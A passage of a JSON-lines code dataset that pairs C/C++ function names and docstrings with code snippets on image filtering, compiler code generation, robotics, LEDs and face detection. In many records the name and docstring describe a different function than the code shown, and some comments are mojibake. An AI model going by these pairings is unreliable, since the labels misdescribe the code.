playerpositions.size(); i++) {\\n\\t\\t\\tofs << playerpositions[i][0] << \" \" << playerpositions[i][1] << \" \"\\n\\t\\t\\t\\t<< playerpositions[i][2] << \" \" << playerpositions[i][3] << \" \"\\n\\t\\t\\t\\t<< playerpositions[i][4] << \" \" << playerpositions[i][5] << \" \"\\n\\t\\t\\t\\t<< playerpositions[i][6] << \" \" << playerpositions[i][7] << \" \"\\n\\t\\t\\t\\t<< std::endl;\\n\\n\\t\\t}\\n\\t\\tofs.clear(); ofs.close();\\n\\n\\t\\treturn playerpositions;\\n\\t}'}","id":4000}
{"content":"{'function_name': 'Closing', 'docstring': '\/\/ grayscale erosion\\r', 'code': 'int main(int argc, char** argv)\\r\\n{\\r\\n\\tif(argc < 2){\\r\\n\\t\\tcout << \"argument number is wrong! check again\" << endl;\\r\\n\\t\\treturn 0;\\r\\n\\t}\\r\\n\\r\\n\\tint cases = which_func(argv[1]);\\r\\n\\tswitch(cases){\\r\\n\\t\\tcase 1 :{\\r\\n\\t\\t\\tinp.open(\"lena.bmp\");\\r\\n\\t\\t\\tchar out_name[50] = \"Gauss_\";\\r\\n\\t\\t\\tstrcat(out_name, argv[2]);\\r\\n\\t\\t\\tstrcat(out_name, \".bmp\");\\r\\n\\t\\t\\tout.open(out_name);\\r\\n\\t\\t\\tRead_image();\\r\\n\\t\\t\\tint amp = atoi(argv[2]);\\r\\n\\t\\t\\tGenerate_Gauss_Noise(amp);\\r\\n\\t\\t\\tcout << \"The SNR is \" << SNR() << endl;\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tcase 2 :{\\r\\n\\t\\t\\tinp.open(\"lena.bmp\");\\r\\n\\t\\t\\tchar out_name[50] = \"SandP_\";\\r\\n\\t\\t\\tstrcat(out_name, argv[2]);\\r\\n\\t\\t\\tstrcat(out_name, \".bmp\");\\r\\n\\t\\t\\tout.open(out_name);\\r\\n\\t\\t\\tRead_image();\\r\\n\\t\\t\\tdouble threhold = atof(argv[2]);\\r\\n\\t\\t\\tGenerate_Salt_Pepper(threhold);\\r\\n\\t\\t\\tcout << \"The SNR is \" << SNR() << endl;\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tcase 3 :{\\r\\n\\t\\t\\tinp.open(argv[3]);\\r\\n\\t\\t\\tchar out_name[50] = \"Box_\";\\r\\n\\t\\t\\tstrcat(out_name, argv[2]);\\r\\n\\t\\t\\tstrcat(out_name, \".bmp\");\\r\\n\\t\\t\\tout.open(out_name);\\r\\n\\t\\t\\tRead_image();\\r\\n\\t\\t\\tint matrix_size = atoi(argv[2]);\\r\\n\\t\\t\\tBox_Filter(matrix_size);\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tcase 4 :{\\r\\n\\t\\t\\tinp.open(argv[3]);\\r\\n\\t\\t\\tchar out_name[50] = \"Median_\";\\r\\n\\t\\t\\tstrcat(out_name, argv[2]);\\r\\n\\t\\t\\tstrcat(out_name, \".bmp\");\\r\\n\\t\\t\\tout.open(out_name);\\r\\n\\t\\t\\tRead_image();\\r\\n\\t\\t\\tint matrix_size = atoi(argv[2]);\\r\\n\\t\\t\\tMedian_Filter(matrix_size);\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tcase 5 :{\\r\\n\\t\\t\\tinp.open(argv[2]);\\r\\n\\t\\t\\tchar out_name[50] = \"Open_Clos.bmp\";\\r\\n\\t\\t\\tout.open(out_name);\\r\\n\\t\\t\\tRead_image();\\r\\n\\t\\t\\tOpening();\\r\\n\\t\\t\\tWriteback();\\r\\n\\t\\t\\tClosing();\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tcase 6 :{\\r\\n\\t\\t\\tinp.open(argv[2]);\\r\\n\\t\\t\\tchar out_name[50] = \"Clos_Open.bmp\";\\r\\n\\t\\t\\tout.open(out_name);\\r\\n\\t\\t\\tRead_image();\\r\\n\\t\\t\\tClosing();\\r\\n\\t\\t\\tWriteback();\\r\\n\\t\\t\\tOpening();\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tcase 0 :{\\r\\n\\t\\t\\tcout << \"No this function! Check again.\" << endl;\\r\\n\\t\\t\\treturn 0;\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tdefault :{\\r\\n\\t\\t\\tcout << \"Unexpected error! Please contact the author.\" << endl;\\r\\n\\t\\t\\treturn 0;\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\n\\t\/\/ output the image\\r\\n\\tfor(int i=511; i>=0; i--){\\r\\n\\t\\tfor(int j=0; j<512; j++){\\r\\n\\t\\t\\tout << OMap[i][j];\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\n\\tinp.close();\\r\\n\\tout.close();\\r\\n\\r\\n\\treturn 0;\\r\\n}'}","id":4007}
{"content":"{'function_name': 'demosaic_bxb_rd5_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaic_diff_rd0_select(demosaic_cache& demosaic, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaic_diff_rd0 read pattern: { demosaic_diff_update_0[d0, d1] -> demosaic[2d0, d1] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ Read schedule : { demosaic_diff_update_0[d0, d1] -> [5 + d1, 3 + d0, 10] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ Write schedule: { demosaic_update_0[d0, d1] -> [3 + d1, 2 + d0, 5] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ DD fold: { demosaic_diff_update_0[d0, d1] -> 1923 : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  auto value_demosaic_demosaic_update_0_write0 = demosaic.demosaic_demosaic_update_0_write0_merged_banks_4.peek_1923();\\n  return value_demosaic_demosaic_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":4013}
{"content":"{'function_name': 'get_safe', 'docstring': '\/\/ template can not be deduce by the out type', 'code': 'O get_safe(I input) {        \/\/ template can not be deduce by the out type\\n        return safe_cast_<O,I>::get(input);\\n    }'}","id":4017}
{"content":"{'function_name': 'vec_cross', 'docstring': '\/\/compute cross product\\r', 'code': 'T vec_dot(const vector<T>&vector_1, const vector<T>&vector_2)\\r\\n{\/\/input 2 vector, output dot product\\r\\n    auto dotProduct = 0.0f;\\r\\n    for(int i = 0 ; i <(int)vector_1.size(); i++)\\r\\n        dotProduct += vector_1[i]*vector_2[i];\\r\\n    return dotProduct;\\r\\n}'}","id":4021}
{"content":"{'function_name': 'parallelPlane', 'docstring': '\/\/Plane with distace (l) from (r0(0) x + r0(1) y + r0(2) z + r0(3) = 0)', 'code': 'bool calcCommonLine(const VectorXd& r0, const VectorXd& r1, Vector3& p, Vector3& e)\\n{\\n  \/\/Common line (p + t e) between two planes  (r0(0) x + r0(1) y + r0(2) z + r0(3) = 0) and (r1(0) x + r1(1) y + r1(2) z + r1(3) = 0)\\n  Vector3 a0(r0(0), r0(1), r0(2));\\n  Vector3 a1(r1(0), r1(1), r1(2));\\n\\n  Vector3 e_tmp = cross(a0, a1);\\n\\n  if(abs(e_tmp) < 1.0e-15)\\n     return false;\\n\\n  e = e_tmp\/abs(e_tmp);\\n\\n  MatrixXd V(2,3);\\n  V(0,0) = r0(0);  V(0,1) = r0(1);  V(0,2) = r0(2);\\n  V(1,0) = r1(0);  V(1,1) = r1(1);  V(1,2) = r1(2);\\n\\n  VectorXd d(2), x(3);\\n  d(0) = -r0(3);\\n  d(1) = -r1(3);\\n\\n  solveLinearEquation(V, d, x);\\n\\n  p << x(0), x(1), x(2);\\n\\n  return true;\\n\\n}'}","id":4023}
{"content":"{'function_name': 'DCCDisp_BytCmpMem_impl', 'docstring': \"\/* Special optimization for _very_ large compare: use 'rep scasb\/w\/l' *\/\", 'code': \"PRIVATE void \/* Same as 'DCCDisp_BytCmpMem_impl', but 'src' is a register only known at runtime. *\/\\nDCCDisp_ByrCmpMem_impl(rc_t src, width_t max_width, struct DCCMemLoc const *__restrict dst,\\n                       target_siz_t dst_bytes, struct DCCMemLoc const *__restrict nejmp) {\\n struct DCCMemLoc dst_iter = *dst;\\n unsigned int score = 3;\\n if unlikely(!dst_bytes) return;\\n if ((src&DCC_RI_MASK) == DCC_ASMREG_EAX) --score;\\n if ((dst->ml_reg&DCC_RI_MASK) == DCC_ASMREG_EDI) score -= (!dst->ml_off && !dst->ml_sym) ? 2 : 1;\\n \/* Special optimization for _very_ large compare: use 'rep scasb\/w\/l' *\/\\n if (dst_bytes >= REPMOV_THRESHOLD(score)) {\\n  DCCDisp_DoRepByrCmpMem_impl(src,max_width,dst,dst_bytes,nejmp);\\n  return;\\n }\\n dst_iter.ml_off += dst_bytes;\\n for (;;) {\\n  target_siz_t part = max_width;\\n  if (part > dst_bytes) {\\n#if DCC_TARGET_SIZEOF_ARITH_MAX > 4\\n   if (dst_bytes <= 7 &&\\n       dst_bytes >= 5) part = 4;\\n   else\\n#endif\\n   if (dst_bytes == 3) part = 2;\\n   else                part = dst_bytes;\\n  }\\n#ifdef DCC_RC_I64\\n       if (part < 8) src &= ~(DCC_RC_I64);\\n  else\\n#endif\\n       if (part < 4) src &= ~(DCC_RC_I32);\\n  else if (part < 2) src &= ~(DCC_RC_I16);\\n  dst_iter.ml_off -= part;\\n  DCCDisp_RegBinMem('?',src,&dst_iter,1);\\n  dst_bytes -= part;\\n  if (!dst_bytes) break;\\n  DCCDisp_LocJcc(DCC_TEST_NE,nejmp);\\n }\\n}\"}","id":4026}
{"content":"{'function_name': 'Java_nimbus_nativestructs_CSet_c_1iterInit', 'docstring': '\/\/ check whether or not we have created an iterator for this map before', 'code': 'JNIEXPORT jboolean JNICALL Java_nimbus_nativestructs_CSet_c_1iterHasNext(JNIEnv *, jobject, jint si, jint index)\\n{\\t\\n\\tsettype* set = csetSetFactory.Get(si);\\t\\t\\n\\t\/\/ check whether or not we have created an iterator for this map before\\n\\tSetToItersMapConstIter iter = setToIterMap.find(si);\\n\\tif (iter != setToIterMap.end())\\n\\t{\\n\\t\\t\/\/ if we have, then we will want to add a new set const iter with a new index\\n\\t\\tIndexedToIterMapConstIter indexIter = iter->second->find(index);\\n\\t\\treturn (*(*indexIter).second) != set->end();\\n\\t}\\n\\n\\treturn false;\\t\\n}'}","id":4029}
{"content":"{'function_name': 'PrintParamsDescription', 'docstring': '\/\/ print the description of all parameters', 'code': 'int PrintParamValues(FILE *out, ParamStruct params[])\\n{\\n\\n  int i=0;\\n\\n  \/\/ is output stream null\\n\\n  if (out==NULL)\\n    return 0;\\n\\n  \/\/ print out the header (the description of information that follows)\\n\\n  fprintf(out,\"Parameter Values:\\\\n\\\\n\");\\n  fputs(\"Description                                                Identifier                 Type       Value\\\\n\",out);\\n  fprintf(out,\"----------------------------------------------------------------------------------------------------------------\\\\n\");\\n\\n  \/\/ print out the descriptions and the values of all parameters\\n\\n  while (params[i].type!=PARAM_END)\\n    {\\n      if (params[i].type!=PARAM_DIVIDER)\\n\\tfprintf(out,\"%-58s %-26s %-10s \",params[i].description,params[i].identifier, typeDesc[params[i].type]);\\n\\n      switch (params[i].type)\\n\\t{\\n\\tcase PARAM_CHAR:\\n\\t  if (params[i].getValueDescription)\\n\\t    {\\n\\t      fprintf(out,\"%i (\",*((char*)params[i].where));\\n\\t      fputs((*((GetValueDescription*)params[i].getValueDescription))(*((char*)params[i].where)),out);\\n\\t      fprintf(out,\")\");\\n\\t    }\\n\\t  else\\n\\t    fprintf(out,\"%i\",*((char*)params[i].where));\\n\\t  break;\\n\\n\\tcase PARAM_INT:\\n\\t  if (params[i].getValueDescription)\\n\\t    {\\n\\t      fprintf(out,\"%i (\",*((char*)params[i].where));\\n\\t      fputs((*((GetValueDescription*)params[i].getValueDescription))(*((int*)params[i].where)),out);\\n\\t      fprintf(out,\")\");\\n\\t    }\\n\\t  else\\n\\t    fprintf(out,\"%i\",*((int*)params[i].where));\\n\\t  break;\\n\\n\\tcase PARAM_LONG:\\n\\t  fprintf(out,\"%li\",*((long*)params[i].where));\\n\\t  break;\\n\\n\\tcase PARAM_FLOAT:\\n\\t  fprintf(out,\"%f\",*((float*)params[i].where));\\n\\t  break;\\n\\n\\tcase PARAM_STRING:\\n\\t  if (*((char**)params[i].where))\\n\\t    fputs(*((char**)params[i].where),out);\\n\\t  else\\n\\t    fputs(\"(null)\",out);\\n\\t  break;\\n\\t  \\n\\tcase PARAM_DIVIDER:\\n\\t  break;\\n\\t}\\n\\n      fprintf(out,\"\\\\n\");\\n\\n      i++;\\n    }\\n\\n  return 0;\\n}'}","id":4035}
{"content":"{'function_name': 'p_GeoDaWeight__HasIsolates', 'docstring': '\/\/ invoke the function', 'code': 'double p_GeoDaWeight__GetSparsity(SEXP xp)\\n{\\n  \/\/ grab the object as a XPtr (smart pointer) to GeoDaWeight\\n  Rcpp::XPtr<GeoDaWeight> ptr(xp);\\n\\n  \/\/ invoke the function\\n  double sparsity = ptr->GetSparsity();\\n\\n  return sparsity;\\n}'}","id":4047}
{"content":"{'function_name': 'SceneManagerDestroy', 'docstring': '\/* Free *\/', 'code': 'void\\nSceneManagerAddWindow(\\n\\t_In_ Window_t *Window)\\n{\\n\\t\/* Vars *\/\\n\\tDataKey_t Key;\\n\\n\\t\/* Sanity *\/\\n\\tif (GlbSceneManager == NULL)\\n\\t\\treturn;\\n\\n\\t\/* Get active scene (todo) *\/\\n\\tKey.Value = 0;\\n\\tScene_t *ActiveScene = (Scene_t*)ListGetDataByKey(GlbSceneManager->Scenes, Key, 0);\\n\\n\\t\/* Assign a unique id *\/\\n\\tWindow->Id = GlbSceneManager->IdWindowGen;\\n\\tGlbSceneManager->IdWindowGen++;\\n\\n\\t\/* Update Scene *\/\\n\\tSceneAddWindow(ActiveScene, Window);\\n}'}","id":4055}
{"content":"{'function_name': 'operation', 'docstring': '\/\/ for determining if the given string is missing an operand', 'code': \"float stringToFloat(char a[],int index){  \/\/converts string to float data type\\n\\tint i=index,point,y=1,num1=0,num2=0;\\n\\tfloat fnum;\\n\\twhile(a[i]!='\\\\0'){\\n\\t\\tif(a[i]=='.'){\\n\\t\\t\\tpoint=i;\\n\\t\\t\\tbreak;\\n\\t\\t}\\n\\t\\ti++;\\n\\t}\\n\\tfor(i=index;a[i]!='\\\\0'&& a[i]!=' ';i++){\\n\\t\\tif(i<point){\\n\\t\\t\\tnum1 = num1 * 10 + ( a[i] - '0' );\\n\\t\\t}\\n\\t\\telse if(i == point){\\n\\t\\t\\tcontinue;\\n\\t\\t}\\n\\t\\telse {\\n\\t\\t\\tnum2 =\\tnum2 * 10 +( a[i] - '0' );\\n\\t\\t\\ty = y * 10;  \\n\\t\\t}\\n\\t}\\n\\tfnum = num2 \/ (float) y;\\n\\tfnum+=num1;\\n\\treturn fnum;\\n}\"}","id":4056}
{"content":"{'function_name': 'SortSpectrumSamples', 'docstring': '\/\/\u4ece\u5c0f\u5230\u5927\u6392\u5e8f', 'code': 'Float InterpolateSpectrumSamples(const Float *lambda, const Float *vals,\\n                                        int n, Float wl){\\n#ifdef DEBUG\\n\\t\/\/\u6570\u636e\u68c0\u67e5\\n\\tfor (int i = 0; i < n - 1; ++i) {\\n\\t\\tAssert(lambda[i] < lambda[i + 1]);\\n\\t}\\n#endif\\n\\tif(wl<lambda[0]){\\n\\t\\treturn vals[0];\\n\\t}\\n\\tif(wl>lambda[n-1]){\\n\\t\\treturn vals[n-1];\\n\\t}\\n\\tif(n==1){\\n\\t\\treturn vals[0];\\n\\t}\\n\\t\/\/\u4f7f\u7528\u4e8c\u5206\u6cd5\uff0c\u9700\u627e\u5230\u6ce2\u957f\u6240\u5728\u7684\u533a\u95f4\\n\\t\/\/\u8fd9\u91cc\u7684lambda\u8868\u8fbe\u5f0f\uff0c\u662f\u6211\u7b2c\u4e8c\u6b21\u8fd0\u7528\uff0coh yeah\\n\\tint offset=FindInterval(n,[&](int index){return lambda[index]<wl;});\\n\\tFloat t=(wl-lambda[offset])\/(lambda[offset+1]-lambda[offset]);\\n\\treturn Lerp(t,vals[offset],vals[offset+1]);\\n}'}","id":4059}
{"content":"{'function_name': 'MimeOleContentTypeFromUrl', 'docstring': '\/\/ Done\\r', 'code': 'MIMEOLEAPI MimeOleCombineMhtmlUrl(\\r\\n                                  \/* in *\/        LPSTR              pszRootUrl,\\r\\n                                  \/* in *\/        LPSTR              pszBodyUrl,\\r\\n                                  \/* out *\/       LPSTR             *ppszUrl)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT         hr=S_OK;\\r\\n    ULONG           cchPrefix=lstrlen(c_szMHTMLColon);\\r\\n\\r\\n    \/\/ Invalid Arg\\r\\n    if (NULL == pszRootUrl || NULL == pszBodyUrl || NULL == ppszUrl)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Init\\r\\n    *ppszUrl = NULL;\\r\\n\\r\\n    \/\/ Allocate memory: pszRootUrl + ! + pszBodyUrl\\r\\n    DWORD cchSize = (cchPrefix + lstrlen(pszRootUrl) + lstrlen(pszBodyUrl) + 2);\\r\\n    CHECKALLOC(*ppszUrl = (LPSTR)g_pMalloc->Alloc(cchSize));\\r\\n\\r\\n    \/\/ Root must start with mhtml:\/\/pszRootUrl!pszBodyUrl\\r\\n    if (StrCmpNI(pszRootUrl, c_szMHTMLColon, cchPrefix) != 0)\\r\\n        wnsprintfA(*ppszUrl, cchSize, \"%s%s!%s\", c_szMHTMLColon, pszRootUrl, pszBodyUrl);\\r\\n    else\\r\\n        wnsprintfA(*ppszUrl, cchSize, \"%s!%s\", pszRootUrl, pszBodyUrl);\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":4061}
{"content":"{'function_name': 'chooseColor', 'docstring': '\/\/ get a random color', 'code': 'bool fadeToColorContinue() {\\n  if (!fadeColorRunning) {\\n    return false;\\n  }\\n  unsigned long now = millis();\\n  if (int(now - fadeColorLastTime) < fadeColorWaitTime) {\\n    return true;\\n  }\\n  strip.setBrightness(fadeColorBrightness); \/\/ seem to need to set both color and brightness\\n  setAllPixelsTo(fadingColor); \/\/ to get things to work\\n  fadeColorBrightness += fadeColorInc;  \\n  if ((fadeColorBrightness > 255) || (fadeColorBrightness < 0)) {\\n    fadeColorRunning = false;\\n  }\\n  if (!fadeColorRunning) {\\n    setAllPixelsTo(fadingColor);  \/\/ finalize the color\\n    LEDsAreOn = fadingColor != offColor;\\n    strip.setBrightness(255);   \/\/ turn brightness back on so indicators are visible\\n    strip.show();\\n  }\\n  fadeColorLastTime = now;\\n  return fadeColorRunning;\\n}'}","id":4072}
{"content":"{'function_name': 'p_GeoDaWeight__GetNeighbors', 'docstring': '\/\/ convert to Rcpp::StringVector', 'code': 'NumericVector p_GeoDaWeight__GetNeighborWeights(SEXP xp, int obs_idx)\\n{\\n  \/\/ grab the object as a XPtr (smart pointer) to GeoDaWeight\\n  Rcpp::XPtr<GeoDaWeight> ptr(xp);\\n\\n  \/\/ invoke the function\\n  std::vector<double> nnw = ptr->GetNeighborWeights(obs_idx);\\n\\n  \/\/ convert to Rcpp::StringVector\\n  NumericVector nv_nnw(nnw.size());\\n\\n  for (int i=0; i<nnw.size(); ++i) {\\n    nv_nnw[i] = nnw[i];\\n  }\\n\\n  return nv_nnw;\\n}'}","id":4075}
{"content":"{'function_name': 'mySigintHandler', 'docstring': '\/\/ All the default sigint handler does is call shutdown()', 'code': 'int main(int argc, char **argv)\\n{\\n  ros::init(argc, argv, \"create2_driver_node\");\\n\\n  ros::NodeHandle nh(\"~\");\\n\\n  std::string port;\\n  nh.param<std::string>(\"port\", port, \"\/dev\/ttyUSB0\");\\n  int brcPin;\\n  nh.param<int>(\"brcPin\", brcPin, 87);\\n  bool useBrcPin;\\n  nh.param<bool>(\"useBrcPin\", useBrcPin, false);\\n\\n  \/\/ Override the default ros sigint handler.\\n  \/\/ This must be set after the first NodeHandle is created.\\n  signal(SIGINT, mySigintHandler);\\n\\n  g_create2 = new Create2ROS(port, brcPin, useBrcPin);\\n\\n  ros::Rate loop_rate(10);\\n  while (ros::ok())\\n  {\\n\\n    g_create2->update();\\n\\n    ros::spinOnce();\\n    loop_rate.sleep();\\n  }\\n\\n  return 0;\\n}'}","id":4077}
{"content":"{'function_name': 'count', 'docstring': '\/\/ values from 1 to V\\r', 'code': 'int main()\\r\\n {\\r\\n\\t\/\/welcome Anshuman Varshney\\r\\n\\tint p;\\r\\n\\tcin>>p;\\r\\n\\twhile(p--)\\r\\n\\t{\\r\\n\\t    int n,k,i,c=0;\\r\\n\\t    cin>>k>>n;\\r\\n\\t    int a[n];\\r\\n\\t    for(i=0;i<n;i++)\\r\\n\\t        cin>>a[i];\\r\\n\\t   cout<<count(a,n,k)<<\"\\\\n\";\\r\\n\\t}\\r\\n\\treturn 0;\\r\\n}'}","id":4078}
{"content":"{'function_name': 'jit_kinect2_matrix_calc', 'docstring': '\/\/ If valid object and valid output', 'code': 'void jit_kinect2_copy(void* type, long dimcount, long *dim, long planecount, t_jit_matrix_info *in_minfo, char *bip,t_jit_matrix_info *out_minfo, char *bop, t_jit_parallel_ndim_worker *para_worker)\\n{\\n    long i,j,k;\\n    if (dimcount<1) return; \/\/safety\\n    if (!bip || ! bop) return; \/\/ safety\\n    \\n    FRAMETYPE frametype = *(FRAMETYPE *)type;\\n    \\n    \/\/ OFFSET para\\n    bip += para_worker->offset[1] * in_minfo->dimstride[0];\\n    bop += para_worker->offset[1] * out_minfo->dimstride[0];\\n    \\n    long width = in_minfo->dim[0];\\n    long height = in_minfo->dim[1];\\n    \\n    for(i=0; i < height; i++) \/\/ for each row\\n    {\\n        for(j=0; j < width; j++)  \/\/ go across each column\\n        {\\n            switch (frametype)\\n            {\\n                case Color:\\n                    if (in_minfo->type == _jit_sym_char) {\\n                        for(k=0; k < in_minfo->planecount; k++)  \/\/ go across each column\\n                        {\\n                            if(k==0)\\n                                bop[j*out_minfo->planecount+k] = 0x00;\\n                            else\\n                                bop[j*out_minfo->planecount+k] = ((unsigned char*)bip)[j*in_minfo->planecount+in_minfo->planecount-k-1];\\n                        }\\n                    }\\n                    break;\\n                case Registration:\\n                    if (in_minfo->type == _jit_sym_char) {\\n                        for(k=0; k < in_minfo->planecount; k++)  \/\/ go across each column\\n                        {\\n                            if(k==0)\\n                                bop[j*out_minfo->planecount+k] = 0x00;\\n                            else\\n                                bop[j*out_minfo->planecount+k] = ((unsigned char*)bip)[j*in_minfo->planecount+in_minfo->planecount-k-1];\\n                        }\\n                    }\\n                    break;\\n                case IR:\\n                    if (in_minfo->type == _jit_sym_char) {\\n                        bop[j] = ((Float32*)bip)[j]\/256;\\n                    }\\n                    break;\\n                case Depth:\\n                    if (in_minfo->type == _jit_sym_char) {\\n                        \\n                        float dist = 256.0f* (512.0f\/((Float32*)bip)[j]);\\n                        bool invalid = dist <= 0 || dist == INFINITY || dist == NAN;\\n                        for(k=0; k < in_minfo->planecount; k++)  \/\/ go across each column\\n                        {\\n                            if(k==0)\\n                                bop[j*out_minfo->planecount+k] = invalid ? 0xFF : 0x00;\\n                            else if (k==1)\\n                                bop[j*out_minfo->planecount+k] = invalid ? 0x00 : fabsf(dist);\\n                            else if (k==2)\\n                                bop[j*out_minfo->planecount+k] = invalid ? 0x00 : fabsf(dist);\\n                            else if (k==3)\\n                                bop[j*out_minfo->planecount+k] = invalid ? 0x00 : fabsf(dist);\\n                        }\\n                    }\\n                    break;\\n                default:\\n                    break;\\n            }\\n        }\\n        bop += out_minfo->dimstride[1];\/\/*yscale;\\n        bip += in_minfo->dimstride[1];\/\/*yscale;\\n    }\\n    \/\/std::cout << \"Drawn: \" << width << \" x \" << height << std::endl;\\n}'}","id":4085}
{"content":"{'function_name': 'MP_QUICKMsgParser', 'docstring': '\/*\\n\\t\\t\\n\\t\\tswitch(pTempMsg->Protocol)\\n\\t\\t{\\n\\t\\tcase MP_QUICK_ADD_SYN:\\n\\t\\t\\t{\\n\\t\\t\\t\\tMSG_QUICK_ADD_SYN * msg = (MSG_QUICK_ADD_SYN *)pMsg;\\n\\t\\t\\t\\tCPlayer * player = (CPlayer *)g_pUserTable->FindUser(msg->dwObjectID);\\n\\t\\t\\t\\tif(!player) return;\\n\\t\\t\\t\\tQUICKMNGR->AddQuickItem(player, msg);\\n\\t\\t\\t}\\n\\t\\t\\tbreak;\\n\\t\\tcase MP_QUICK_USE_SYN:\\n\\t\\t\\t{\\n\\t\\t\\t\\tMSG_QUICK_USE_SYN * msg = (MSG_QUICK_USE_SYN *)pMsg;\\n\\t\\t\\t\\tCPlayer * player = (CPlayer *)g_pUserTable->FindUser(msg->dwObjectID);\\n\\t\\t\\t\\tif(!player) return;\\n\\t\\t\\t\\tplayer->UseQuickItem(msg->wQuickRelPosition);\\n\\t\\t\\t}\\n\\t\\t\\tbreak;\\n\\t\\tcase MP_QUICK_MOVE_SYN:\\n\\t\\t\\t{\\n\\t\\t\\t\\tMSG_QUICK_MOVE_SYN * msg = (MSG_QUICK_MOVE_SYN *)pMsg;\\n\\t\\t\\t\\tCPlayer * player = (CPlayer *)g_pUserTable->FindUser(msg->dwObjectID);\\n\\t\\t\\t\\tif(!player) return;\\n\\t\\t\\t\\tQUICKMNGR->MoveQuickItem(player, msg);\\n\\t\\t\\t}\\n\\t\\t\\tbreak;\\n\\t\\tcase MP_QUICK_REM_SYN:\\n\\t\\t\\t{\\n\\t\\t\\t\\tMSG_QUICK_REM_SYN * msg = (MSG_QUICK_REM_SYN *)pMsg;\\n\\t\\t\\t\\tCPlayer * player = (CPlayer *)g_pUserTable->FindUser(msg->dwObjectID);\\n\\t\\t\\t\\tif(!player) return;\\n\\t\\t\\t\\t\\n\\t\\t\\t\\tQUICKMNGR->RemQuickItem(player, msg);\\n\\t\\t\\t}\\n\\t\\t\\tbreak;\\n\\t\\t}*\/', 'code': 'void MP_UNGIJOSIKMsgParser(DWORD dwConnectionIndex, char* pMsg, DWORD dwLength)\\n{\\n\\tMSGBASE* pTempMsg = (MSGBASE*)pMsg;\\t\\n\\tCPlayer* pPlayer = (CPlayer *)g_pUserTable->FindUser(pTempMsg->dwObjectID);\\n\\t\\n\\tif(pPlayer == NULL)\\n\\t\\treturn;\\n\\t\\n\\t\/\/SW070127 \ud0c0\uc774\ud0c4\\n\\tif( pPlayer->InTitan() )\\n\\t{\\n\\t\\tASSERT(0);\\n\\t\\treturn;\\n\\t}\\n\\n\\tswitch(pTempMsg->Protocol)\\n\\t{\\n\\tcase MP_UNGIJOSIK_START:\\n\\t\\tUNGIMGR->UngijosikMode(pPlayer, TRUE);\\n\\t\\tbreak;\\n\\n\\tcase MP_UNGIJOSIK_END:\\n\\t\\tUNGIMGR->UngijosikMode(pPlayer, FALSE);\\n\\t\\tbreak;\\n\\t}\\n}'}","id":4087}
{"content":"{'function_name': 'detectBothEyes', 'docstring': '\/\/\u017d\u00e6\u017d\u00a2\u0152\u00ec\u00b2\u00e2\u00b5\u00c4\u0153\u00e1\u00b9\u00fb', 'code': 'Mat getPreprocessedFace(Mat &srcImg, int desiredFaceWidth, CascadeClassifier &faceCascade, CascadeClassifier &eyeCascade1, CascadeClassifier &eyeCascade2, bool doLeftAndRightSeparately, Rect *storeFaceRect, Point *storeLeftEye, Point *storeRightEye, Rect *searchedLeftEye, Rect *searchedRightEye)\\n{\\n\\n    int desiredFaceHeight = desiredFaceWidth;\\n\/\/ Mark the detected face region and eye search regions as invalid, in case they aren\\'t detected.\\nif (storeFaceRect)\\nstoreFaceRect->width = -1;\\nif (storeLeftEye)\\nstoreLeftEye->x = -1;\\nif (storeRightEye)\\nstoreRightEye->x = -1;\\nif (searchedLeftEye)\\nsearchedLeftEye->width = -1;\\nif (searchedRightEye)\\nsearchedRightEye->width = -1;\\n\\n\/\/ Find the largest face.\\nRect faceRect;\\ndetectLargestObject(srcImg, faceCascade, faceRect);\\n\\n\/\/ Check if a face was detected.\\nif (faceRect.width > 0) {\\n\\n    \/\/ Give the face rect to the caller if desired.\\n    if (storeFaceRect)\\n        *storeFaceRect = faceRect;\\n\\n    Mat faceImg = srcImg(faceRect);    \/\/ Get the detected face image.\u00cd\u0152\u00c6\u00ac\u00d6\u00d0\u0152\u00d3\u0178\u00d8\u00d0\u00ce\u00b0\u00d1\u00cf\u00eb\u00d2\u00aa\u00b5\u00c4\u00b2\u00bf\u00b7\u00d6\u00c4\u00c3\u00b3\u00f6\u00c0\u017d\\n    \/\/ If the input image is not grayscale, then convert the BGR or BGRA color image to grayscale.\\n    Mat gray;\\n    if (faceImg.channels() == 3) {\\n        cvtColor(faceImg, gray, CV_BGR2GRAY);\\n    }\\n    else if (faceImg.channels() == 4) {\\n        cvtColor(faceImg, gray, CV_BGRA2GRAY);\\n    }\\n    else {\\n        \/\/ Access the input image directly, since it is already grayscale.\\n        gray = faceImg;\\n    }\\n\\n    \/\/ Search for the 2 eyes at the full resolution, since eye detection needs max resolution possible!\\n    Point leftEye, rightEye;\/\/\u017d\u00e6\u00b7\u00c5\u00c1\u0153\u00d1\u00db\u00d6\u00d0\u00d0\u00c4\u00ce\u00bb\u00d6\u00c3\\n    detectBothEyes(gray, eyeCascade1, eyeCascade2, leftEye, rightEye, searchedLeftEye, searchedRightEye);\\n\\n    \/\/ Give the eye results to the caller if 